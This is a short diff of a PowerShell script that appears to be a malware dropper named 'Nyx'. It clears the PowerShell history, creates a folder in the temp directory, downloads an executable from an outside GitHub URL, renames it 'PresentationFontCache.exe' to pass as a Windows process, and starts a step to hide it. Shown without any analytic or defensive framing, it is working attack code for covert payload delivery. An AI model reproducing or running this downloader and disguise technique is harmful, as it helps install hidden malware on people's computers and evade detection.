@@ -12,10 +12,13 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 } else {
 
+# Create folder for Nyx
+New-Item -Path "$env:TEMP" -Name "B8XY4K5A" -ItemType Directory
+
 # Download Nyx
 Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/B8XY4K5A/B8XY4K5A.exe -OutFile "$env:TEMP\B8XY4K5A\B8XY4K5A.exe"
 
-# Change Nyx Name
+# Change Nyx name
 Rename-Item -Path "$env:TEMP\B8XY4K5A\B8XY4K5A.exe" -NewName "PresentationFontCache.exe"
 
 # Hide Nyx
